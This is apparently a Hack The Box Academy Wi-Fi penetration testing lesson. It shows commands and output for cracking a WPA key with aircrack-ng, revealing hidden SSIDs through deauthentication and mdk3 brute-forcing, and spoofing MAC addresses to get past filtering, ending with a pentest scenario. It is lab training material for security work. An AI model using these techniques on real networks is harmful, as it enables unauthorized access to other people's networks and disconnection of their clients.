Aircrack-ng has the capability to crack the WPA key once a "four-way handshake" has been captured using Airodump-ng. To crack WPA/WPA2 pre-shared keys, only a dictionary-based method can be employed, which necessitates the use of a wordlist containing potential passwords. A "four-way handshake" serves as the required input. For WPA handshakes, a complete handshake comprises four packets. However, Aircrack-ng can effectively operate with just two packets. Specifically, EAPOL packets 2 and 3, or packets 3 and 4, are considered a full handshake.

```shell
aircrack-ng HTB.pcap -w /opt/wordlist.txt

Reading packets, please wait...
Opening HTB.pcap
Read 1093 packets.

   #  BSSID              ESSID                     Encryption

   1  2D:0C:51:12:B2:33  HTB-Wireless              WPA (1 handshake, with PMKID)
   2  DA:28:A7:B7:30:84                            Unknown
   3  53:68:F7:B7:51:B9                            Unknown
   4  95:D1:46:23:5A:DD                            Unknown

Index number of target network ? 1

Reading packets, please wait...
Opening HTB.pcap
Read 1093 packets.

1 potential targets

                               Aircrack-ng 1.6

      [00:00:00] 802/14344392 keys tested (2345.32 k/s)

      Time left: 1 hour, 41 minutes, 55 seconds                  0.01%

                           KEY FOUND! [ HTB@123 ]

      Master Key     : A2 88 FC F0 CA AA CD A9 A9 F5 86 33 FF 35 E8 99
                       2A 01 D9 C1 0B A5 E0 2E FD F8 CB 5D 73 0C E7 BC

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

      EAPOL HMAC     : A4 62 A7 02 9A D5 BA 30 B6 AF 0D F3 91 98 8E 45

```

* * *

## Moving On

In the next section, we will examine how to connect to different types of Wi-Fi networks using both graphical and command-line interfaces, once we have recovered the network password.


# Connecting to Wi-Fi Networks

* * *

Connecting to Wi-Fi networks using Linux involves a few straightforward steps. First, we need to scan for available networks, which can be done using tools like `iwlist` or through a `graphical network manager`. Once we identify the target network, we can connect by configuring the appropriate settings. In this section, we will explore how to connect to Wi-Fi networks using both graphical and command-line interfaces.

* * *

## Using GUI

Connecting to a Wi-Fi network with a GUI is typically a straightforward process. Once we obtain the valid credentials (either a passphrase for WPA/WPA2-Personal, username/password for WPA/WPA2-Enterprise or key for WEP), we simply input them into the password prompt provided by the system's network manager.

Here’s a breakdown of how this process usually works using GUI:

1. `Scan for Networks`
2. `Select the Network`
3. `Enter Credentials`
4. `Connect`![NMTUI Connect B](https://academy.hackthebox.com/storage/modules/222/wifi_connect.png)![NMTUI Connect A](https://academy.hackthebox.com/storage/modules/222/bypass_mac/bypass_mac_2.png)![NMTUI Connect A](https://academy.hackthebox.com/storage/modules/222/bypass_mac/bypass_mac_3.png)

* * *

## Using CLI

If we've obtained the correct password for a network or simply want to connect to one, we may not always have access to the graphical network manager. In such cases, we’ll need to connect to the wireless network using the terminal. Fortunately, there are several methods available to achieve this from the command line. To connect to a network via the command line, we would use `wpa_supplicant` along with a `configuration` file that contains the necessary network details. This allows us to authenticate and connect to the network directly from the terminal.

Typically, we would switch our interface to monitor mode to scan for nearby networks. However, if we're limited or our interface doesn't support monitor mode, we can use managed mode instead. In this case, we can utilize the iwlist tool along with some grep parameters to filter and display useful information like the cell, signal quality, ESSID, and IEEE version of the networks around us.

```shell
sudo iwlist wlan0 s | grep 'Cell\|Quality\|ESSID\|IEEE'

          Cell 01 - Address: D8:D6:3D:EB:29:D5
                    Quality=61/70  Signal level=-49 dBm
                    ESSID:"HackMe"
                    IE: IEEE 802.11i/WPA2 Version 1
          Cell 02 - Address: 3E:C1:D0:F2:5D:6A
                    Quality=70/70  Signal level=-30 dBm
                    ESSID:"HackTheBox"
          Cell 03 - Address: 9C:9A:03:39:BD:71
                    Quality=70/70  Signal level=-30 dBm
                    ESSID:"HTB-Corp"
                    IE: IEEE 802.11i/WPA2 Version 1

```

As shown in the output above, there are three available Wi-Fi networks. One uses `WEP`, one uses `WPA`, and one uses `WPA-Enterprise`. We'll begin by connecting to the WEP network first.

#### Connecting to WEP Networks

If the target network is using WEP, connecting is straightforward. We just need to provide the `SSID`, the `WEP hex key`, and set the WEP key index using `wep_tx_keyidx` in a configuration file (e.g., wep.conf) to establish the connection. Additionally, we set `key_mgmt=NONE`, which is used for WEP or networks with no security.

```config
network={
	ssid="HackTheBox"
    key_mgmt=NONE
    wep_key0=3C1C3A3BAB
    wep_tx_keyidx=0
}

```

Once the configuration file is ready, we can use `wpa_supplicant` to connect to the network. We run the command with the `-c` option to specify the configuration file and the `-i` option to specify the network interface.

```shell
sudo wpa_supplicant -c wep.conf -i wlan0

Successfully initialized wpa_supplicant
wlan0: SME: Trying to authenticate with 3e:c1:d0:f2:5d:6a (SSID='HackTheBox' freq=2412 MHz)
wlan0: Trying to associate with 3e:c1:d0:f2:5d:6a (SSID='HackTheBox' freq=2412 MHz)
wlan0: Associated with 3e:c1:d0:f2:5d:6a
wlan0: CTRL-EVENT-CONNECTED - Connection to 3e:c1:d0:f2:5d:6a completed [id=0 id_str=]
wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0

```

After connecting, we can obtain an IP address by using the `dhclient` utility. This will assign an IP from the network's DHCP server, completing the connection setup.

```shell
sudo dhclient wlan0

```

```shell
ifconfig wlan0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.2.7  netmask 255.255.255.0  broadcast 192.168.2.255
        ether f6:65:bc:77:c9:21  txqueuelen 1000  (Ethernet)
        RX packets 7  bytes 1217 (1.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 14  bytes 3186 (3.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

#### Connecting to WPA Personal Networks

If the target network uses WPA/WPA2, we'll need to create a wpa\_supplicant configuration file (eg: wpa.conf) with the correct `PSK` (Pre-Shared Key) and `SSID`. This file will look like the following:

```config
network={
	ssid="HackMe"
    psk="password123"
}

```

Then we could initiate our wpa connection to the AP using the following command.

```shell
sudo wpa_supplicant -c wpa.conf -i wlan0

Successfully initialized wpa_supplicant
wlan0: SME: Trying to authenticate with d8:d6:3d:eb:29:d5 (SSID='HackMe' freq=2412 MHz)
wlan0: Trying to associate with d8:d6:3d:eb:29:d5 (SSID='HackMe' freq=2412 MHz)
wlan0: Associated with d8:d6:3d:eb:29:d5
wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan0: WPA: Key negotiation completed with d8:d6:3d:eb:29:d5 [PTK=CCMP GTK=CCMP]
wlan0: CTRL-EVENT-CONNECTED - Connection to d8:d6:3d:eb:29:d5 completed [id=0 id_str=]

```

After connecting, we can obtain an IP address by using the `dhclient` utility. This will assign an IP from the network's DHCP server, completing the connection setup.
However, if we have a previously assigned DHCP IP address from a different connection, we'll need to release it first. Run the following command to remove the existing IP address:

```shell
sudo dhclient wlan0 -r

Killed old client process

```

We can now run the dhclient command. This will assign an IP from the network's DHCP server, completing the connection setup.

```shell
sudo dhclient wlan0

```

```shell
ifconfig wlan0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.7  netmask 255.255.255.0  broadcast 192.168.1.255
        ether f6:65:bc:77:c9:21  txqueuelen 1000  (Ethernet)
        RX packets 37  bytes 6266 (6.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 41  bytes 6967 (6.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

If the network uses `WPA3` instead of WPA2, we would need to add `key_mgmt=SAE` to our wpa\_supplicant configuration file to connect to it. This setting specifies the use of the `Simultaneous Authentication of Equals (SAE)` protocol, which is a key component of WPA3 security.

#### Connecting to WPA Enterprise

If the target network uses WPA/WPA2 Enterprise (MGT), we'll need to create a wpa\_supplicant configuration file with the correct `identity`, `password`, `SSID` and `key_mgmt`. This file will look like this:

```config
network={
  ssid="HTB-Corp"
  key_mgmt=WPA-EAP
  identity="HTB\Administrator"
  password="Admin@123"
}

```

Once the configuration file is ready, we can use `wpa_supplicant` to connect to the network. We run the command with the `-c` option to specify the configuration file and the `-i` option to specify the network interface.

```shell
sudo wpa_supplicant -c wpa_enterprsie.conf -i wlan0

Successfully initialized wpa_supplicant
wlan0: SME: Trying to authenticate with 9c:9a:03:39:bd:71 (SSID='HTB-Corp' freq=2412 MHz)
wlan0: Trying to associate with 9c:9a:03:39:bd:71 (SSID='HTB-Corp' freq=2412 MHz)
wlan0: Associated with 9c:9a:03:39:bd:71
wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan0: CTRL-EVENT-EAP-STARTED EAP authentication started
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan0: CTRL-EVENT-EAP-METHOD EAP vendor 0 method 25 (PEAP) selected
wlan0: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/C=US/ST=California/L=San Fransisco/O=HTB/CN=htb.com' hash=46b80ecdee1a588b1fed111307a618b8e4429d7cb9e639fe976741e1a1e2b7ae
wlan0: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/C=US/ST=California/L=San Fransisco/O=HTB/CN=htb.com' hash=46b80ecdee1a588b1fed111307a618b8e4429d7cb9e639fe976741e1a1e2b7ae
EAP-MSCHAPV2: Authentication succeeded
wlan0: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
wlan0: PMKSA-CACHE-ADDED 9c:9a:03:39:bd:71 0
wlan0: WPA: Key negotiation completed with 9c:9a:03:39:bd:71 [PTK=CCMP GTK=CCMP]
wlan0: CTRL-EVENT-CONNECTED - Connection to 9c:9a:03:39:bd:71 completed [id=0 id_str=]

```

After connecting, we can obtain an IP address by using the `dhclient` utility. This will assign an IP from the network's DHCP server, completing the connection setup.
However, if we have a previously assigned DHCP IP address from a different connection, we'll need to release it first. Run the following command to remove the existing IP address:

```shell
sudo dhclient wlan0 -r

Killed old client process

```

```shell
sudo dhclient wlan0

```

```shell
ifconfig wlan0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.3.7  netmask 255.255.255.0  broadcast 192.168.3.255
        ether f6:65:bc:77:c9:21  txqueuelen 1000  (Ethernet)
        RX packets 66  bytes 10226 (10.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 77  bytes 11532 (11.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

#### Connecting with Network Manager Utilities

One of the ways that we can easily connect to wireless networks in Linux is through the usage of nmtui. This utility will give us a somewhat graphical perspective while connecting to these wireless networks.

```shell
sudo nmtui

```

Once we enter the command above, we should see the following view.

![NMTUI Connect A](https://academy.hackthebox.com/storage/modules/222/1-connect.png)

If we select `Activate a connection`, we should be able to choose from a list of wireless networks. We might be prompted to enter our password upon connecting to the network.

![NMTUI Connect B](https://academy.hackthebox.com/storage/modules/222/2-connect.png)

* * *

## Moving On

In the next section, we will delve into effective methods for discovering `hidden SSIDs` (Service Set Identifiers). Hidden SSIDs are networks that do not broadcast their network name, making them less visible to casual users and potential attackers. However, with the right techniques and tools, these hidden networks can still be identified and analyzed.


# Finding Hidden SSIDs

* * *

In WiFi networks, the Service Set Identifier (SSID) is the name that identifies a particular wireless network. While most networks broadcast their SSIDs to make it easy for devices to connect, some networks choose to hide their SSIDs as a security measure. The idea behind hiding an SSID is to make the network less visible to casual users and potential attackers. However, this method only provides a superficial layer of security, as determined attackers can still discover hidden SSIDs using various techniques.

In this section, we'll delve into the methods used to uncover these hidden network names. Understanding how to find hidden SSIDs is crucial for both network administrators looking to secure their networks and penetration testers aiming to assess the security of wireless environments. By the end of this section, you'll have a comprehensive understanding of the tools and techniques used to reveal hidden SSIDs, enhancing your overall knowledge of WiFi security.

![image](https://academy.hackthebox.com/storage/modules/222/hidden_ssid/hidden_1.png)

As shown in the above screenshot, no WiFi networks are visible during the scan. Let's proceed by attempting to uncover some hidden WiFi networks.

* * *

#### Watching the Hidden Network

First, we need to set our interface to monitor mode.

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

* * *

#### Scanning WiFi Networks

We can use `airodump-ng` to scan for available wifi networks.

```shell
sudo airodump-ng -c 1 wlan0mon

CH  1 ][ Elapsed: 0 s ][ 2024-05-21 20:45

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B2:C1:3D:3B:2B:A1  -47   0        9        0    0   1   54   WPA2 CCMP   PSK  <length: 12>
 D2:A3:32:13:29:D5  -28   0        9        0    0   1   54   WPA3 CCMP   SAE  <length:  8>
 A2:FF:31:2C:B1:C4  -28   0        9        0    0   1   54   WPA2 CCMP   PSK  <length:  4>

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B2:C1:3D:3B:2B:A1  02:00:00:00:02:00  -29    0 -24      0        4

```

From the above output, we can see that there are three hidden SSIDs. The `<length: x>` notation indicates the length of the WiFi network name, where x represents the number of characters in the SSID.

There are multiple ways to discover the name of a hidden SSID. If there are clients connected to the WiFi network, we can use `aireplay-ng` to send deauthentication requests to the client. When the client reconnects to the hidden SSID, `airodump-ng` will capture the request and reveal the SSID. However, deauthentication attacks do not work on [WPA3](https://github.com/aircrack-ng/aircrack-ng/issues/2539) networks since WPA3 has 802.11w (Protected Management Frames, [PMF](https://www.wi-fi.org/beacon/philipp-ebbecke/protected-management-frames-enhance-wi-fi-network-security)) which authenticates the deauthentication. In such cases, we can attempt a brute-force attack to determine the SSID name.

* * *

### Detecting Hidden SSID using Deauth

The first way to find a hidden SSID is to perform a deauthentication attack on the clients connected to the WiFi network, which allows us to capture the request when they reconnect. From the above `airodump-ng` scan, we observed that a client with the STATION ID `02:00:00:00:02:00` is connected to the BSSID `B2:C1:3D:3B:2B:A1`. Let's start the `airodump-ng` capture on channel `1` and use `aireplay-ng` to send deauthentication requests to the client.

We should start sniffing our network on `channel 1` with airodump-ng.

```shell
sudo airodump-ng -c 1 wlan0mon

```

In order to force the client to send a probe request, it needs to be disconnected. We can do this with aireplay-ng.

```shell
sudo aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan0mon

12:34:56  Waiting for beacon frame (BSSID: B2:C1:3D:3B:2B:A1) on channel `
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|60 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|57 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|61 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|60 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|59 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|58 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|58 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|58 ACKs]
12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 11|55 ACKs]

```

After sending the deauthentication requests using `aireplay-ng`, we should see the name of the hidden SSID appear in `airodump-ng` once the client reconnects to the WiFi network. This process leverages the re-association request, which contains the SSID name, and allows us to capture and identify the hidden SSID.

```shell
sudo airodump-ng -c 1 wlan0mon

CH  1 ][ Elapsed: 0 s ][ 2024-05-21 20:45

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B2:C1:3D:3B:2B:A1  -47   0        9        0    0   1   54   WPA2 CCMP   PSK  jacklighters

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B2:C1:3D:3B:2B:A1  02:00:00:00:02:00  -29    0 -24      0        4         jacklighters

```

* * *

### Bruteforcing Hidden SSID

Another way to discover a hidden SSID is to perform a brute-force attack. We can use a tool like [mdk3](https://github.com/charlesxsh/mdk3-master) to carry out this attack. With mdk3, we can either provide a wordlist or specify the length of the SSID so the tool can automatically generate potential SSID names.

Basic syntax for mdk3 is as following:

```Usage
mdk3 <interface> <test mode> [test_ options]

```

The `p` test mode argument in mdk3 stands for Basic probing and ESSID Bruteforce mode. It offers the following options:

| **Option** | **Description** |
| --- | --- |
| `-e` | Specify the SSID for probing. |
| `-f` | Read lines from a file for brute-forcing hidden SSIDs. |
| `-t` | Set the MAC address of the target AP. |
| `-s` | Set the speed (Default: unlimited, in Bruteforce mode: 300). |
| `-b` | Use full brute-force mode (recommended for short SSIDs only). This switch is used to show its help screen |

#### Bruteforcing all possible values

To bruteforce with all possible values, we can use `-b` as the `test_option` in mdk3. We can set the following options for it.

- upper case (u)
- digits (n)
- all printed (a)
- lower and upper case (c)
- lower and upper case plus numbers (m)

```shell
sudo mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4

SSID Bruteforce Mode activated!

channel set to: 1
Waiting for beacon frame from target...

SSID is hidden. SSID Length is: 4.
Sniffer thread started

Got response from A2:FF:31:2C:B1:C4, SSID: "WIFI"
Last try was: WIFI

```

#### Bruteforcing using a Wordlist

To bruteforce using a wordlist we can use `-f` as the `test_option` in mdk3 followed by the location of the wordlist.

```shell
sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5

SSID Wordlist Mode activated!

Waiting for beacon frame from target...
Sniffer thread started

SSID is hidden. SSID Length is: 8.

Got response from D2:A3:32:1B:29:D5, SSID: "HTB-Wifi"

```

With the new discovery of the SSIDs, if we had the PSK or were able to gather it through some means, we would be able to connect to the network in question. In the next section, we will dive into an additional basic control that access points might possess, which is MAC filtering (whitelisting).

* * *

## Moving On

In this section, we examined how to find hidden SSIDs using various methods, including deauthentication attacks and brute-forcing techniques. These methods revealed the processes and strategies for uncovering networks that are not openly visible, and provided a foundation for understanding network visibility and security.

In the upcoming section, we will explore a different basic control bypass technique: bypassing MAC filtering. MAC filtering is a security measure used to permit or deny access to a network based on the MAC addresses of devices. By the end of this section, we will have a thorough understanding of MAC filtering, how to effectively bypass it, and how to apply these techniques in real-world scenarios for network security evaluations.


# Bypassing Mac Filtering

* * *

Bypassing MAC filtering in Wi-Fi networks is a technique used to circumvent a basic security measure that many wireless routers implement. MAC filtering involves allowing only devices with specific MAC (Media Access Control) addresses to connect to the network. While this adds a layer of security by restricting access to known devices, it is not foolproof. Skilled individuals can exploit weaknesses in this system to gain unauthorized access. This process typically involves MAC address spoofing, where an attacker changes their device's MAC address to match an allowed device, thereby gaining access to the network.

Suppose we're attempting to connect to a network with MAC filtering enabled. Knowing the password might not be sufficient if our MAC address is not authorized. Fortunately, we can usually overcome this obstacle through MAC spoofing, allowing us to bypass the filtering and gain access to the network.

First, we would want to scout out our network with airodump-ng.

#### Scanning Available Wifi Networks

```shell
sudo airodump-ng wlan0mon

 CH  37 ][ Elapsed: 3 mins ][ 2024-05-18 22:14  ][ WPA handshake: 52:CD:8C:79:AD:87

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 52:CD:8C:79:AD:87  -47      407      112    0   1   54   WPA2 CCMP   PSK  HTB-Wireless

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 52:CD:8C:79:AD:87  3E:48:72:B7:62:2A  -29    0 - 1     0        68         HTB-Wireless
 52:CD:8C:79:AD:87  2E:EB:2B:F0:3C:4D  -29    0 - 9     0        78  EAPOL  HTB-Wireless
 52:CD:8C:79:AD:87  1A:50:AD:5A:13:76  -29    0 - 1     0        88  EAPOL  HTB-Wireless
 52:CD:8C:79:AD:87  46:B6:67:4F:50:32  -29    0 -36     0        90  EAPOL  HTB-Wireless

```

From the output, we can see that the ESSID `HTB-Wireless` is available on `channel 1` and has multiple clients connected to it. Suppose we have obtained the credentials for the `HTB-Wireless` WiFi network, with the password `Password123!!!!!!`. Despite having the correct login details, our connection attempts are thwarted by MAC filtering enforced by the network. This security measure restricts access to only authorized devices based on their MAC addresses. As a result, even with the correct password, our device is unable to establish a connection to the network.

To bypass the MAC filtering, we can spoof our MAC address to match one of the connected clients. However, this approach often leads to collision events, as two devices with the same MAC address cannot coexist on the same network simultaneously.

A more effective method would be to either forcefully disconnect the legitimate client through deauthentication attacks, thereby freeing up the MAC address for use, or to wait for the client to disconnect naturally. This strategy is particularly effective in "bring your own device" (BYOD) networks, where devices frequently connect and disconnect.

Occasionally, when configuring our MAC address to match that of a client or access point, we may encounter collision events at the data-link layer. This technique of bypassing MAC filtering is most effective when the client we're mimicking is not currently connected to our target network. However, there are instances where these collision events become advantageous to us, serving as a means of denial-of-service (DOS) attack. In the case of a `dual-band` or `multiple access point network`, we may be able to utilize a MAC address of a client connected to a separate access point within the same wireless infrastructure.

We can also check if there is a 5 GHz band available for the ESSID. If the 5 GHz band is available, we can attempt to connect to the network using that frequency, which would avoid collision events since most clients are connected to the 2.4 GHz band.

#### Scanning Networks Running on 5Ghz Band

```shell
sudo airodump-ng wlan0mon --band a

 CH  48 ][ Elapsed: 3 mins ][ 2024-05-18 22:14  ][ WPA handshake: 52:CD:8C:79:AD:87

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 52:CD:8C:79:AD:87  -28       11        0    0  48   54   WPA2 CCMP   PSK  HTB-Wireless-5G

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   3E:48:72:B7:62:2A  -29    0 - 1     0        6          HTB-Wireless
 (not associated)   2E:EB:2B:F0:3C:4D  -29    0 - 1     0        9          HTB-Wireless
 (not associated)   1A:50:AD:5A:13:76  -29    0 - 1     0        7          HTB-Wireless
 (not associated)   46:B6:67:4F:50:32  -29    0 - 1     0        12         HTB-Wireless

```

From the above output, we can confirm that the ESSID `HTB-Wireless-5G` with the same BSSID is also operating on the `5 GHz` band. Since no clients are currently connected to the 5 GHz band, we can spoof our MAC address using tools such as [macchanger](https://github.com/alobbs/macchanger) to match one of the clients connected to the 2.4 GHz band and connect to the 5 GHz network without any collision events.

Before changing our MAC address, let's stop the monitor mode on our wireless interface.

```shell
sudo airmon-ng stop wlan0mon

```

![image](https://academy.hackthebox.com/storage/modules/222/bypass_mac/bypass_mac_1.png)

Let's check our current MAC address before changing it. We can do this by running the following command in the terminal.

```shell
sudo macchanger wlan0

Current MAC:   00:c0:ca:98:3e:e0 (ALFA, INC.)
Permanent MAC: 00:c0:ca:98:3e:e0 (ALFA, INC.)

```

As shown in the output, our Current MAC address and Permanent MAC address are `00:c0:ca:98:3e:e0`. Let's use `macchanger` to change our MAC address to match one of the clients connected to the 2.4 GHz network, specifically `3E:48:72:B7:62:2A`. This process involves disabling the `wlan0` interface, executing the `macchanger` command to adjust the MAC address, and finally reactivating the `wlan0` interface. Following these steps will effectively synchronize our device's MAC address with the specified client's address on the 2.4 GHz network.

#### Disable wlan0 interface

```shell
sudo ifconfig wlan0 down

```

#### Change the MAC address

```shell
sudo macchanger wlan0 -m 3E:48:72:B7:62:2A

Current MAC:   00:c0:ca:98:3e:e0 (ALFA, INC.)
Permanent MAC: 00:c0:ca:98:3e:e0 (ALFA, INC.)
New MAC:       3e:48:72:b7:62:2a (unknown)

```

#### Enable wlan0 interface

```shell
sudo ifconfig wlan0 up

```

After bringing the wlan0 interface back up, we can utilize the `ifconfig` command to confirm that our MAC address has indeed been modified. This step ensures that our device now adopts the new MAC address we specified earlier, aligning with the desired client's MAC address connected to the 2.4 GHz network.

```shell
ifconfig wlan0

wlan0: flags=4099<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether 3e:48:72:b7:62:2a  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

Now that our MAC address has been changed to match one of the clients connected to the 2.4 GHz network, we can proceed to connect to the 5 GHz WiFi network named `HTB-Wireless-5G`. This can be done either through the graphical user interface (GUI) of the system's network manager or via the command line using tools like NetworkManager's command-line interface (nmcli).

![image](https://academy.hackthebox.com/storage/modules/222/bypass_mac/bypass_mac_2.png)

![image](https://academy.hackthebox.com/storage/modules/222/bypass_mac/bypass_mac_3.png)

After successfully connecting to the 5 GHz network, we can verify the connection status by running the `ifconfig` command once more. This time, we should observe that a DHCP-assigned IP address has been allocated by the WiFi network.

```shell
ifconfig

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.2.73  netmask 255.255.255.0  broadcast 192.168.0.255
        ether 2e:87:ba:cf:b7:53  txqueuelen 1000  (Ethernet)
        RX packets 565  bytes 204264 (199.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 32  bytes 4930 (4.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

Once connected to the WiFi network, we can scan for other clients connected to the same network within the IP range.

* * *

## Closing Thoughts

Wi-Fi penetration testing is a critical skill for assessing and improving network security. The basics we’ve covered in this module provide a strong starting point. We explored how to connect to Wi-Fi networks using both GUI and CLI, use the aircrack-ng suite to perform different attacks, and discover hidden SSIDs. Additionally, we discussed changing interface modes, adjusting signal strength and frequencies, and bypassing MAC filters to overcome access restrictions. These tools and techniques offer a solid introduction to wireless security, setting the stage for deeper exploration and advanced skills.

Mastering these fundamentals will empower you to not only identify vulnerabilities but also to take proactive steps in securing Wi-Fi networks. As you continue exploring, remember that each network presents unique challenges, and honing your skills through practice is the best way to stay ahead in this dynamic field. Keep pushing the boundaries, and soon, more advanced techniques will become second nature.


# Wi-Fi Penetration Testing Basics - Skills Assessment

* * *

## Scenario

* * *

The CISO of our client, `GamerZone Studios`, recently attended a cybersecurity conference where they participated in an intro to attacking WiFi devices. Given the company's reliance on wireless networks for game development, testing, and daily operations, the CISO is concerned about potential vulnerabilities and security misconfigurations in their WiFi infrastructure. He has requested our team to conduct a thorough penetration test on their WiFi networks, focusing on identifying and exploiting any weaknesses that could jeopardize their wireless security. Our task is to map out the available wireless networks, identify hidden SSIDs, and test for vulnerabilities in their encryption, configuration, and client interactions.

Your objective is to uncover any flaws that could be exploited to gain unauthorized access or disrupt the network, ensuring `GamerZone Studios` can address these issues promptly and maintain a secure wireless environment.

Harness the WiFi attack techniques you learned in this module to disclose all of the security vulnerabilities.

* * *

Note: Please wait for 2 minutes after the target spawn to connect


